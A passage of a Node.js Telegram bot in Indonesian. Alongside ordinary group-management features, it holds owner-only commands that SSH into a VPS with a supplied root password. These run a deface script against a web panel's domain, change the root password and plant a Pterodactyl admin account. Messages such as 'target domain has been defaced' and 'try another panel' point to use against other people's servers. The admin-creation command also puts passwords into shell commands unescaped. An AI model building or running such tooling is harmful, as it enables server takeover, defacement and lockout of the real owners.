       `<blockquote>"<tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> <b>Harap reply pesan bot yang meminta emoji premium!</b>\n\nKetik /cekemoji untuk memulai ulang.</blockquote>`, 
        { parse_mode: "HTML" }
      );
    }

    const entities = msg.entities || msg.caption_entities;

    if (!entities || entities.length === 0) {
      waitingForEmoji.delete(userId);
      return bot.sendMessage(chatId, `
<blockquote><tg-emoji emoji-id="5805345674383855340">◾️</tg-emoji>
Tidak ada emoji terdeteksi. Silahkan kirim ulang dengan emoji premium.
</blockquote>`, { parse_mode: "HTML" });
    }

    const customEmoji = entities.find(e => e.type === "custom_emoji");

    if (!customEmoji) {
      waitingForEmoji.delete(userId);
      return bot.sendMessage(chatId, `
<blockquote><tg-emoji emoji-id="6100467849548010364">◾️</tg-emoji>
Itu bukan emoji premium / custom emoji. Silahkan kirim ulang emoji premium yang benar.
</blockquote>`, { parse_mode: "HTML" });
    }

    const emojiId = customEmoji.custom_emoji_id;
    const text = msg.reply_to_message.text || msg.reply_to_message.caption || "";
    const emojiChar = text.substring(
      customEmoji.offset,
      customEmoji.offset + customEmoji.length
    );
    waitingForEmoji.delete(userId);

    await bot.sendMessage(chatId, `
<blockquote><tg-emoji emoji-id="6269243378332864932">◾️</tg-emoji> <b>Custom Emoji Terdeteksi!</b>
<tg-emoji emoji-id="5334890573281114250">◾️</tg-emoji> ID: <code>${emojiId}</code>
<tg-emoji emoji-id="5400111356772905255">◾️</tg-emoji> Cara pakai:
<code>&lt;tg-emoji emoji-id="${emojiId}"&gt;${emojiChar}&lt;/tg-emoji&gt;</code>
</blockquote>`, { parse_mode: "HTML" });

    return;
  }

  return;
});

//================== HANDLE ================

bot.on("message", async (msg) => {
  if (!msg.from || msg.from.is_bot) return;

  const users = loadUsers();
  const userId = msg.from.id;

  if (!users[userId]) return;

  if (
    users[userId].username !== msg.from.username ||
    users[userId].first_name !== msg.from.first_name
  ) {
    users[userId].username = msg.from.username || null;
    users[userId].first_name = msg.from.first_name;

    saveUsers(users);
  }
});

bot.on("message", async (msg) => {
  const chatId = msg.chat.id;

  if (!msg.text) return;

  const filters = loadFilters();
  if (!filters[chatId]) return;

  const textLower = msg.text.toLowerCase();

  for (const keyword in filters[chatId]) {

    const regex = new RegExp(`\\b${keyword}\\b`, "i");
    if (!regex.test(textLower)) continue;

    const data = filters[chatId][keyword];

    if (data.file) {

      if (data.file.type === "photo") {
        return bot.sendPhoto(chatId, data.file.file_id, {
          caption: data.text,
          reply_to_message_id: msg.message_id
        });
      }

      if (data.file.type === "video") {
        return bot.sendVideo(chatId, data.file.file_id, {
          caption: data.text,
          reply_to_message_id: msg.message_id
        });
      }

      if (data.file.type === "document") {
        return bot.sendDocument(chatId, data.file.file_id, {
          caption: data.text,
          reply_to_message_id: msg.message_id
        });
      }

      if (data.file.type === "sticker") {
        await bot.sendSticker(chatId, data.file.file_id, {
          reply_to_message_id: msg.message_id
        });

        return bot.sendMessage(chatId, data.text, {
          reply_to_message_id: msg.message_id
        });
      }

    } else {

      return bot.sendMessage(chatId, data.text, {
        reply_to_message_id: msg.message_id
      });
    }
  }
});

bot.on("callback_query", async (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;

  if (data.startsWith("filterpage_")) {
    const page = parseInt(data.split("_")[1]);
    await bot.deleteMessage(chatId, query.message.message_id);
    return sendFilterPage(chatId, page);
  }

  if (data.startsWith("delfilter_")) {
    const parts = data.split("_");
    const keyword = parts[1];
    const page = parseInt(parts[2]);

    const filters = loadFilters();
    if (filters[chatId] && filters[chatId][keyword]) {
      delete filters[chatId][keyword];
      saveFilters(filters);
    }

    await bot.answerCallbackQuery(query.id, { text: `❌ Filter "${keyword}" dihapus!` });

    await bot.deleteMessage(chatId, query.message.message_id);
    return sendFilterPage(chatId, page);
  }
});

bot.on("callback_query", async (cb) => {
  const chatId = cb.message.chat.id;
  const data = cb.data;

  if (!data.startsWith("cekcn_")) return;

  const userId = Number(data.split("_")[1]);

  try {
    const member = await bot.getChatMember(chatId, userId);

    const CN = getGroupMessages()[chatId]?.copyButton || "";
    const currentName =
      (member.user.first_name || "") +
      (member.user.last_name ? " " + member.user.last_name : "");

    const fixedName = currentName.toLowerCase().replace(/\s+/g, " ");
    const fixedCN = CN.toLowerCase().replace(/\s+/g, " ");

    if (!fixedName.includes(fixedCN)) {
      return bot.answerCallbackQuery(cb.id, {
        text: `❌ Kamu belum pasang CN: ${CN}`,
        show_alert: true
      });
    }

    const groups = getGroupMessages();
    if (groups[chatId]?.pendingCN) {
      delete groups[chatId].pendingCN[userId];
      saveGroupMessages(groups);
    }

    bot.answerCallbackQuery(cb.id, {
      text: "✅ CN berhasil diverifikasi!",
      show_alert: true
    });

    bot.editMessageReplyMarkup(
      { inline_keyboard: [] },
      { chat_id: chatId, message_id: cb.message.message_id }
    );
  } catch (err) {
    console.error(err);
  }
});

bot.on("new_chat_members", async (msg) => {
  const chatId = msg.chat.id;
  const groupName = escapeHtml(msg.chat.title);
  const data = getGroupMessages();
  const memberCount = await bot.getChatMemberCount(chatId);
  
  const usedLink = msg.invite_link?.invite_link;

  if (usedLink && activeLinks[usedLink]) {
    const linkData = activeLinks[usedLink];
    const newUser = msg.new_chat_members[0];

  if (Date.now() > linkData.expireAt) {
    await bot.revokeChatInviteLink(chatId, usedLink);
    delete activeLinks[usedLink];
    return bot.sendMessage(chatId, "⏳ Link sudah expired.");
  }

  if (
    linkData.target !== newUser.username &&
    linkData.target !== String(newUser.id)
  ) {
    await bot.banChatMember(chatId, newUser.id);
    await bot.unbanChatMember(chatId, newUser.id);

    await bot.revokeChatInviteLink(chatId, usedLink);
    delete activeLinks[usedLink];

    return bot.sendMessage(chatId, "❌ User tidak sesuai target.");
  }

  await bot.revokeChatInviteLink(chatId, usedLink);
    delete activeLinks[usedLink];

    bot.sendMessage(chatId, "🔒 Link otomatis dihapus setelah dipakai.");
  }

  if (!data[chatId]?.welcomeEnabled) return

  const template = data[chatId]?.welcome
  const photo = data[chatId]?.welcomePhoto || DEFAULT_WELCOME_PIC;
  const contactBtn = data[chatId]?.contactButton;
  const copyBtn = data[chatId]?.copyButton;

  const CN = (data[chatId]?.copyButton || "").trim();
  const TIME = data[chatId]?.cnTime || 0;

  if (!template) return;

  msg.new_chat_members.forEach(async (user) => {
    const waktu = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    const fullName = mentionUser(user)
    const userId = `<code>${user.id}</code>`
    const tanggal = moment().tz("Asia/Jakarta").format("dddd, DD MMMM YYYY");
    const members = `<code>${memberCount}</code>`;
    
    const caption = template
      .replace(/@name/gi, fullName)
      .replace(/@group/gi, groupName)
      .replace(/@time/gi, waktu)
      .replace(/@id/gi, userId)
      .replace(/@date/gi, tanggal)
      .replace(/@members/gi, members);

    let kb = [];

    if (contactBtn) {
      kb.push([{ text: contactBtn.text, url: contactBtn.url }]);
    }

    if (copyBtn) {
      const copyText = `${copyBtn} ${fullName}`;
      kb.push([{ text: copyText, switch_inline_query_current_chat: copyText }]);
    }

    if (CN && TIME > 0) {
      kb.push([{ text: "🔍 Cek CN", callback_data: `cekcn_${user.id}` }]);
    }

    bot.sendPhoto(chatId, photo, {
      caption,
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: kb }
    });

    const groups = getGroupMessages();
    groups[chatId] = groups[chatId] || {};
    groups[chatId].pendingCN = groups[chatId].pendingCN || {};
    groups[chatId].pendingCN[user.id] = true;
    saveGroupMessages(groups);

    if (CN && TIME > 0) {
      setTimeout(async () => {
        const groups = getGroupMessages();
        if (!groups[chatId]?.pendingCN?.[user.id]) return;

        try {
          const member = await bot.getChatMember(chatId, user.id);
          const currentName =
            (member.user.first_name || "") +
            (member.user.last_name ? " " + member.user.last_name : "");

          const fixedName = currentName.toLowerCase().replace(/\s+/g, " ");
          const fixedCN = CN.toLowerCase().replace(/\s+/g, " ");

          if (!fixedName.includes(fixedCN)) {
            await bot.banChatMember(chatId, user.id);
            bot.sendMessage(
              chatId,
              `🚫 User *${currentName}* dikeluarkan karena tidak memasang CN *${CN}*.`,
              { parse_mode: "Markdown" }
            );
          } else {
            delete groups[chatId].pendingCN[user.id];
            saveGroupMessages(groups);
          }
        } catch (err) {
          console.error(err);
        }
      }, TIME);
    }
  });
});

bot.on('left_chat_member', (msg) => {
  const chatId = msg.chat.id;
  const groupName = escapeHtml(msg.chat.title);
  const data = getGroupMessages();
  
  if (!data[chatId]?.leftEnabled) return
  
  const template = data[chatId]?.left
  const photo = data[chatId]?.leftPhoto || DEFAULT_LEFT_PIC;
  const contactBtn = data[chatId]?.contactButton;
  const copyBtn = data[chatId]?.copyButton;

  if (!template) return;

  const user = msg.left_chat_member;
  const waktu = moment().tz("Asia/Jakarta").format("HH:mm:ss");

  const fullName = escapeHtml(
    user.first_name + (user.last_name ? " " + user.last_name : "")
  )
  const nameTag = fullName;

  const text = template
    .replace(/@name/gi, nameTag)
    .replace(/@group/gi, groupName)
    .replace(/@time/gi, waktu);

  const kb = [];

  if (contactBtn) {
    kb.push([{ text: contactBtn.text, url: contactBtn.url }]);
  }

  if (copyBtn) {
    const copyText = `${copyBtn} ${nameTag}`;
    kb.push([{ text: copyText, switch_inline_query_current_chat: copyText }]);
  }

  const opts = {
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: kb }
  };

  bot.sendPhoto(chatId, photo, { ...opts, caption: text });
});


/* ================= COMMANDS ================= */

bot.onText(/^\/deface$/i, async (msg) => {
 const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *𝙰𝚔𝚜𝚎𝚜 𝙳𝚒𝚝𝚘𝚕𝚊𝚔*\n𝙰𝚗𝚍𝚊 𝚝𝚒𝚍𝚊𝚔 𝚖𝚎𝚖𝚒𝚕𝚒𝚔𝚒 𝚒𝚣𝚒𝚗 𝚞𝚗𝚝𝚞𝚔 𝚖𝚎𝚗𝚐𝚐𝚞𝚗𝚊𝚔𝚊𝚗 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 𝚒𝚗𝚒.",
            { parse_mode: "Markdown" }
        );
    }

  sessions.set(msg.chat.id, { step: "ip" });
  bot.sendMessage(msg.chat.id, "𝚔𝚒𝚛𝚒𝚖 𝚒𝚙 𝚟𝚙𝚜 𝚗𝚢𝚊 𝚠𝚘𝚒:");
});

bot.onText(/^\/reset (.+)$/i, async (msg, match) => {
  if (!isOwner(msg.from.id))
    return bot.sendMessage(msg.chat.id, "❌ 𝚔𝚊𝚖𝚞 𝚋𝚞𝚔𝚊𝚗 𝚘𝚠𝚗𝚎𝚛 𝚊𝚜𝚞");

  try {
    const parts = match[1].split("|");
    const ip = parts[0];
    const pw = parts[1];
    const domain = normalizeDomain(parts[2]);

    await sshExec({
      host: ip,
      password: pw,
      command: resetScript(domain),
    });

    bot.sendMessage(msg.chat.id, "𝚜𝚞𝚌𝚌𝚎𝚜𝚜 𝚍𝚎𝚏𝚊𝚌𝚎 𝚜𝚞𝚍𝚊𝚑 𝚍𝚒 𝚑𝚊𝚙𝚞𝚜");
  } catch (e) {
    bot.sendMessage(msg.chat.id, "❌ 𝚐𝚊𝚐𝚊𝚕 𝚛𝚎𝚜𝚎𝚝");
  }
});

bot.on("message", async (msg) => {
  const sess = sessions.get(msg.chat.id);
  if (!sess) return;
  if (!isOwner(msg.from.id)) return;
  if (msg.text.startsWith("/")) return;

  try {
    if (sess.step === "ip") {
      sess.ip = msg.text.trim();
      sess.step = "pw";
      return bot.sendMessage(msg.chat.id, "𝚔𝚒𝚛𝚒𝚖 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍 𝚟𝚙𝚜 𝚗𝚢𝚊 𝚖𝚊𝚗𝚊:");
    }

    if (sess.step === "pw") {
      sess.pw = msg.text.trim();
      sess.step = "domain";
      return bot.sendMessage(msg.chat.id, "𝚔𝚒𝚛𝚒𝚖 𝚍𝚘𝚖𝚊𝚒𝚗 𝚙𝚊𝚗𝚎𝚕 𝚗𝚢𝚊 (https://domain):");
    }

    if (sess.step === "domain") {
      const domain = normalizeDomain(msg.text);
      sessions.delete(msg.chat.id);

      await sshExec({
        host: sess.ip,
        password: sess.pw,
        command: deployScript(domain),
      });

      bot.sendMessage(msg.chat.id, "𝚜𝚞𝚌𝚌𝚎𝚜𝚜 𝚍𝚘𝚖𝚊𝚒𝚗 𝚝𝚊𝚛𝚐𝚎𝚝 𝚜𝚞𝚍𝚊𝚑 𝚍𝚒 𝚍𝚎𝚏𝚊𝚌𝚎");
    }
  } catch (e) {
    sessions.delete(msg.chat.id);
    bot.sendMessage(msg.chat.id, "❌ 𝚒𝚙 𝚟𝚙𝚜 / 𝚙𝚠 𝚟𝚙𝚜 𝚜𝚊𝚕𝚊𝚑 / 𝚜𝚞𝚍𝚊𝚑 𝚍𝚒 𝚞𝚋𝚊𝚑 𝚙𝚎𝚖𝚒𝚕𝚒𝚔");
  }
});

// ===================== LOGIN VPS FEATURE =====================
const LOGIN_SSH_USER = "root"; // ubah kalau bukan root
const LOGIN_SSH_PORT = 22;     // kalau mau support port, nanti kita tambah

// helper: ssh exec khusus loginvps (pakai user berbeda jika perlu)
function sshExecLogin({ host, password, command, port = LOGIN_SSH_PORT }) {
  const { Client } = require("ssh2");
  return new Promise((resolve, reject) => {
    const conn = new Client();
    conn
      .on("ready", () => {
        conn.exec(command, { pty: true }, (err, stream) => {
          if (err) {
            conn.end();
            return reject(err);
          }
          let out = "", errOut = "";
          stream
            .on("close", (code) => {
              conn.end();
              if (code !== 0) return reject(new Error(errOut || `Exit code ${code}`));
              resolve(out.trim());
            })
            .on("data", (d) => (out += d.toString()))
            .stderr.on("data", (d) => (errOut += d.toString()));
        });
      })
      .on("error", reject)
      .connect({
        host,
        port,
        username: LOGIN_SSH_USER,
        password,
        readyTimeout: 20000,
      });
  });
}
// ================= LOGIN VPS (GABUNG FINAL) =================

// /loginvps (tanpa arg) => contoh
bot.onText(/^\/loginvps$/i, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *𝙰𝚔𝚜𝚎𝚜 𝙳𝚒𝚝𝚘𝚕𝚊𝚔*\n𝙰𝚗𝚍𝚊 𝚝𝚒𝚍𝚊𝚔 𝚖𝚎𝚖𝚒𝚕𝚒𝚔𝚒 𝚒𝚣𝚒𝚗 𝚞𝚗𝚝𝚞𝚔 𝚖𝚎𝚗𝚐𝚐𝚞𝚗𝚊𝚔𝚊𝚗 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 𝚒𝚗𝚒.",
            { parse_mode: "Markdown" }
        );
    }
  bot.sendMessage(
    msg.chat.id,
`𝙵𝚘𝚛𝚖𝚊𝚝:
/loginvps ipvps|pwvps

𝙲𝚘𝚗𝚝𝚘𝚑:
/loginvps 170.64.198.171|passwordvps

𝙼𝚎𝚗𝚞:
• 𝚞𝚋𝚊𝚑 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍 𝚟𝚙𝚜
• 𝚌𝚛𝚎𝚊𝚝𝚎 𝚊𝚍𝚖𝚒𝚗 𝚙𝚊𝚗𝚎𝚕
• 𝚌𝚎𝚔 𝚛𝚊𝚖 & 𝚌𝚙𝚞`
  );
});

// /loginvps ip|pw => login
bot.onText(/^\/loginvps (.+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *𝙰𝚔𝚜𝚎𝚜 𝙳𝚒𝚝𝚘𝚕𝚊𝚔*\n𝙰𝚗𝚍𝚊 𝚝𝚒𝚍𝚊𝚔 𝚖𝚎𝚖𝚒𝚕𝚒𝚔𝚒 𝚒𝚣𝚒𝚗 𝚞𝚗𝚝𝚞𝚔 𝚖𝚎𝚗𝚐𝚐𝚞𝚗𝚊𝚔𝚊𝚗 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 𝚒𝚗𝚒.",
            { parse_mode: "Markdown" }
        );
    }

  try {
    const parts = match[1].split("|").map(x => (x || "").trim());
    const ip = parts[0];
    const pw = parts[1];

    if (!ip || !pw) {
      return bot.sendMessage(
        msg.chat.id,
`❌ 𝚏𝚘𝚛𝚖𝚊𝚝 𝚜𝚊𝚕𝚊𝚑 𝚋𝚎𝚐𝚘

𝚌𝚘𝚗𝚝𝚘𝚑:
/loginvps 170.64.198.171|passwordvps`
      );
    }

    // cek login ssh
    await sshExec({
      host: ip,
      password: pw,
      command: "whoami",
    });

    // detect domain aktif dari nginx (ambil domain pertama yang valid)
    const detectDomainCmd = `
nginx -T 2>/dev/null | awk 'tolower($1)=="server_name"{for(i=2;i<=NF;i++){gsub(/;$/,"",$i); print $i}}' \
| grep -vE '^(localhost|_|default_server)$' \
| grep -vE '^[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+$' \
| grep -vE '^\\*$' \
| sort -u | head -n 1
`.trim();

    let domain = "";
    try {
      domain = await sshExec({
        host: ip,
        password: pw,
        command: detectDomainCmd,
      });
    } catch (e) {}
    if (!domain) domain = "your-domain.com";

    // simpan session
    sessions.set(msg.chat.id, {
      mode: "loginvps",
      ip,
      pw,
      domain,
      step: "menu",
    });

    // menu button (3 tombol) -> tidak hilang saat diklik
    bot.sendMessage(msg.chat.id, "✅ login vps berhasil", {
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔐 𝚞𝚋𝚊𝚑 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍 𝚟𝚙𝚜", callback_data: "changepass" }],
          [{ text: "👑 𝚌𝚛𝚎𝚊𝚝𝚎 𝚊𝚍𝚖𝚒𝚗 𝚙𝚊𝚗𝚎𝚕", callback_data: "createadminpanel" }],
          [{ text: "🔥 𝚌𝚎𝚔 𝚛𝚊𝚖 & 𝚌𝚙𝚞", callback_data: "cekramcpu" }],
        ],
      },
    });

  } catch (e) {
    bot.sendMessage(
      msg.chat.id,
`❌ 𝚕𝚘𝚐𝚒𝚗 𝚟𝚙𝚜 𝚐𝚊𝚐𝚊𝚕

𝚔𝚎𝚖𝚞𝚗𝚐𝚔𝚒𝚗𝚊𝚗:
• 𝚒𝚙 𝚜𝚊𝚕𝚊𝚑
• 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍 𝚜𝚊𝚕𝚊𝚑
• 𝚙𝚠 𝚟𝚙𝚜 𝚜𝚞𝚍𝚊𝚑 𝚍𝚒 𝚐𝚊𝚗𝚝𝚒
• 𝚔𝚊𝚖𝚞 𝚣𝚘𝚗𝚔 𝚌𝚘𝚋𝚊 𝚙𝚊𝚗𝚎𝚕 𝚕𝚊𝚒𝚗`
    );
  }
});

// ================= BUTTON HANDLER =================
bot.on("callback_query", async (q) => {
  const chatId = q.message.chat.id;

  if (!isOwner(q.from.id)) {
    await bot.answerCallbackQuery(q.id, { text: "❌ 𝚔𝚊𝚖𝚞 𝚋𝚞𝚔𝚊𝚗 𝚘𝚠𝚗𝚎𝚛", show_alert: true });
    return;
  }

  const sess = sessions.get(chatId);
  if (!sess || sess.mode !== "loginvps") {
    return;
  }

  // ubah password vps
  if (q.data === "changepass") {
    sess.step = "newpw";
    sessions.set(chatId, sess);
    await bot.answerCallbackQuery(q.id);
    return bot.sendMessage(chatId, "𝚖𝚊𝚜𝚞𝚔𝚔𝚊𝚗 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍 𝚋𝚊𝚛𝚞 𝚟𝚙𝚜:");
  }

  // create admin panel
  if (q.data === "createadminpanel") {
    sess.step = "admin_username";
    sessions.set(chatId, sess);
    await bot.answerCallbackQuery(q.id);
    return bot.sendMessage(chatId, "𝚖𝚊𝚜𝚞𝚔𝚔𝚊𝚗 𝚞𝚜𝚎𝚛𝚗𝚊𝚖𝚎 𝚊𝚍𝚖𝚒𝚗 𝚙𝚊𝚗𝚎𝚕:");
  }

  // cek ram & cpu
  if (q.data === "cekramcpu") {
    await bot.answerCallbackQuery(q.id, { text: "⏳ 𝚌𝚎𝚔 𝚟𝚙𝚜...", show_alert: false });

    try {
      const cmd = `
set -e
HOST=$(hostname)
UP=$(uptime -p 2>/dev/null || true)

CPU_CORES=$(nproc 2>/dev/null || echo "-")
CPU_MODEL=$(lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +/,"",$2); print $2; exit}' || true)

RAM_TOTAL=$(awk '/MemTotal/ {printf "%.2f GB", $2/1024/1024}' /proc/meminfo)
RAM_AVAIL=$(awk '/MemAvailable/ {printf "%.2f GB", $2/1024/1024}' /proc/meminfo)
RAM_USED=$(free -b | awk 'NR==2{printf "%.2f GB", $3/1024/1024/1024}')

DISK=$(df -h / | awk 'NR==2{print $2" total / "$3" used / "$4" free ("$5")"}')

PUBIP=$(curl -fsSL ifconfig.me 2>/dev/null || curl -fsSL ipinfo.io/ip 2>/dev/null || echo "-")

echo "HOST=$HOST"
echo "UPTIME=$UP"
echo "PUBLIC_IP=$PUBIP"
echo "CPU_CORES=$CPU_CORES"
echo "CPU_MODEL=$CPU_MODEL"
echo "RAM_TOTAL=$RAM_TOTAL"
echo "RAM_USED=$RAM_USED"
echo "RAM_AVAIL=$RAM_AVAIL"
echo "DISK_ROOT=$DISK"
`.trim();

      const out = await sshExec({
        host: sess.ip,
        password: sess.pw,
        command: cmd,
      });

      const data = {};
      out.split("\n").forEach((line) => {
        const idx = line.indexOf("=");
        if (idx > 0) data[line.slice(0, idx)] = line.slice(idx + 1);
      });

      const info =
`🖥️ 𝚅𝙿𝚂 𝙳𝙴𝚃𝙰𝙸𝙻 𝙸𝙽𝙵𝙾

𝙷𝚘𝚜𝚝     : ${data.HOST || "-"}
𝚄𝚙𝚝𝚒𝚖𝚎   : ${data.UPTIME || "-"}
𝙿𝚞𝚋𝚕𝚒𝚌 𝙸𝙿: ${data.PUBLIC_IP || "-"}

𝙲𝙿𝚄 𝙲𝚘𝚛𝚎𝚜: ${data.CPU_CORES || "-"}
𝙲𝙿𝚄 𝙼𝚘𝚍𝚎𝚕: ${data.CPU_MODEL || "-"}

𝚁𝙰𝙼 𝚃𝚘𝚝𝚊𝚕: ${data.RAM_TOTAL || "-"}
𝚁𝙰𝙼 𝚄𝚜𝚎𝚍 : ${data.RAM_USED || "-"}
𝚁𝙰𝙼 𝙰𝚟𝚊𝚒𝚕: ${data.RAM_AVAIL || "-"}

𝙳𝚒𝚜𝚔 /   : ${data.DISK_ROOT || "-"}`;

      // kirim pesan baru -> button tetap ada
      await bot.sendMessage(chatId, info);
    } catch (e) {
      await bot.sendMessage(chatId, "❌ gagal cek ram & cpu vps");
    }
    return;
  }
});

// ================= MESSAGE FLOW (INPUT) =================
bot.on("message", async (msg) => {
  const chatId = msg.chat.id;
  const sess = sessions.get(chatId);

  if (!sess) return;
  if (sess.mode !== "loginvps") return;
  if (!isOwner(msg.from.id)) return;
  if (msg.text?.startsWith("/")) return;

  try {
    // ubah password VPS
    if (sess.step === "newpw") {
      const newPw = msg.text.trim();
      if (newPw.length < 6) {
        return bot.sendMessage(chatId, "❌ 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍 𝚝𝚎𝚛𝚕𝚊𝚕𝚞 𝚙𝚎𝚗𝚍𝚎𝚔. 𝚖𝚒𝚗𝚒𝚖𝚊𝚕 𝟼 𝚔𝚊𝚛𝚊𝚔𝚝𝚎𝚛. 𝚔𝚒𝚛𝚒𝚖 𝚕𝚊𝚐𝚒:");
      }

      await sshExec({
        host: sess.ip,
        password: sess.pw,
        command: `echo "root:${newPw.replace(/"/g, '\\"')}" | chpasswd`,
      });

      sessions.delete(chatId);
      return bot.sendMessage(chatId, "✅ 𝚜𝚞𝚌𝚌𝚎𝚜𝚜 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍 𝚟𝚙𝚜 𝚋𝚎𝚛𝚑𝚊𝚜𝚒𝚕 𝚍𝚒𝚞𝚋𝚊𝚑");
    }

    // create admin panel: username
    if (sess.step === "admin_username") {
      const u = msg.text.trim();
      if (!u) return;
      sess.adminUser = u;
      sess.step = "admin_password";
      sessions.set(chatId, sess);
      return bot.sendMessage(chatId, "𝚖𝚊𝚜𝚞𝚔𝚔𝚊𝚗 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍 𝚊𝚍𝚖𝚒𝚗 𝚙𝚊𝚗𝚎𝚕:");
    }

    // create admin panel: password
    if (sess.step === "admin_password") {
      const p = msg.text.trim();
      if (p.length < 8) {
        return bot.sendMessage(chatId, "❌ 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍 𝚖𝚒𝚗𝚒𝚖𝚊𝚕 𝟾 𝚔𝚊𝚛𝚊𝚔𝚝𝚎𝚛. 𝚔𝚒𝚛𝚒𝚖 𝚕𝚊𝚐𝚒 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍 𝚊𝚍𝚖𝚒𝚗 𝚙𝚊𝚗𝚎𝚕:");
      }

      const domain = sess.domain || "your-domain.com";
      const username = sess.adminUser;
      const password = p;

      const email = `${username}@${domain}`;
      const first = username;
      const last = "admin";

      const cmd = `
set -e
cd /var/www/pterodactyl
php artisan p:user:make --email="${email}" --username="${username}" --name-first="${first}" --name-last="${last}" --password="${password}" --admin=1 --no-interaction
echo "OK"
`.trim();

      await sshExec({
        host: sess.ip,
        password: sess.pw,
        command: cmd,
      });

      sessions.delete(chatId);

      return bot.sendMessage(
        chatId,
`𝚂𝚞𝚌𝚌𝚎𝚜 𝚌𝚛𝚎𝚊𝚝𝚎 𝚊𝚍𝚖𝚒𝚗 𝚙𝚊𝚗𝚎𝚕
𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎 : ${username}
𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 : ${password}
𝙻𝚘𝚐𝚒𝚗 : https://${domain}`
      );
    }

  } catch (e) {
    sessions.delete(chatId);
    return bot.sendMessage(chatId, "❌ 𝚐𝚊𝚐𝚊𝚕 𝚙𝚛𝚘𝚜𝚎𝚜 (𝚌𝚎𝚔 𝚙𝚊𝚗𝚎𝚕 𝚙𝚊𝚝𝚑 / 𝚙𝚑𝚙 𝚊𝚛𝚝𝚒𝚜𝚊𝚗 / 𝚙𝚎𝚛𝚖𝚒𝚜𝚜𝚒𝚘𝚗)");
  }
});

// ========= FITUR /tomonyet =========
bot.onText(/\/tomonyet/, async (msg) => {
    const chatId = msg.chat.id;

    const ask = await bot.sendMessage(
        chatId,
        "🐒 *𝙺𝚒𝚛𝚒𝚖 𝚏𝚘𝚝𝚘 𝚔𝚊𝚖𝚞 𝚍𝚎𝚗𝚐𝚊𝚗 𝚖𝚎𝚖𝚋𝚊𝚕𝚊𝚜 (𝚛𝚎𝚙𝚕𝚢) 𝚙𝚎𝚜𝚊𝚗 𝚒𝚗𝚒 — 𝚊𝚔𝚊𝚗 𝚍𝚒𝚞𝚋𝚊𝚑 𝚔𝚎 𝚐𝚊𝚢𝚊 𝚃𝚘𝚖𝚘𝚗𝚢𝚎𝚝.*",
        { parse_mode: "Markdown" }
    );

    // Simpan ID pesan bot supaya nanti pas terima foto bisa dicek reply-nya
    bot.tomonyetAsk = ask.message_id;
});

// Saat user mengirim foto untuk /tomonyet
bot.on("photo", async (msg) => {
    const chatId = msg.chat.id;

    // Pastikan ini reply ke pesan /tomonyet
    if (!msg.reply_to_message || msg.reply_to_message.message_id !== bot.tomonyetAsk) return;

    const fileId = msg.photo[msg.photo.length - 1].file_id;
    const fileUrl = await bot.getFileLink(fileId);

    bot.sendMessage(chatId, "⏳ 𝙼𝚎𝚗𝚐𝚞𝚋𝚊𝚑 𝚏𝚘𝚝𝚘 𝚔𝚊𝚖𝚞 𝚔𝚎 𝚐𝚊𝚢𝚊 𝚃𝚘𝚖𝚘𝚗𝚢𝚎𝚝...");

    try {
        const apiUrl = `https://api-faa.my.id/faa/tomonyet?url=${encodeURIComponent(fileUrl)}`;

        const response = await axios({
            url: apiUrl,
            responseType: "arraybuffer"
        });

        const buffer = Buffer.from(response.data, "binary");

        // Simpan sebagai file JPG biar aman
        const tempPath = path.join(__dirname, "tomonyet_result.jpg");
        fs.writeFileSync(tempPath, buffer);

        await bot.sendPhoto(chatId, tempPath, {
            caption: "🐒✨ 𝙵𝚘𝚝𝚘 𝚋𝚎𝚛𝚑𝚊𝚜𝚒𝚕 𝚍𝚒𝚞𝚋𝚊𝚑 𝚔𝚎 *𝚐𝚊𝚢𝚊 𝚃𝚘𝚖𝚘𝚗𝚢𝚎𝚝*!",
            parse_mode: "Markdown"
        });

        // Hapus file sementara
        fs.unlinkSync(tempPath);

    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "❌ 𝙶𝚊𝚐𝚊𝚕 𝚖𝚎𝚖𝚙𝚛𝚘𝚜𝚎𝚜 𝚏𝚘𝚝𝚘 𝚃𝚘𝚖𝚘𝚗𝚢𝚎𝚝.");
    }

    // Hapus state biar nggak kebawa ke foto lain
    bot.tomonyetAsk = null;
});

// ========= FITUR /tobabi =========
bot.onText(/\/tobabi/, async (msg) => {
    const chatId = msg.chat.id;

    const ask = await bot.sendMessage(
        chatId,
        "🐷 *𝙺𝚒𝚛𝚒𝚖 𝚏𝚘𝚝𝚘 𝚔𝚊𝚖𝚞 𝚍𝚎𝚗𝚐𝚊𝚗 𝚖𝚎𝚖𝚋𝚊𝚕𝚊𝚜 (𝚛𝚎𝚙𝚕𝚢) 𝚙𝚎𝚜𝚊𝚗 𝚒𝚗𝚒 — 𝚊𝚔𝚊𝚗 𝚍𝚒𝚞𝚋𝚊𝚑 𝚔𝚎 𝚐𝚊𝚢𝚊 𝚃𝚘𝚋𝚊𝚋𝚒.*",
        { parse_mode: "Markdown" }
    );

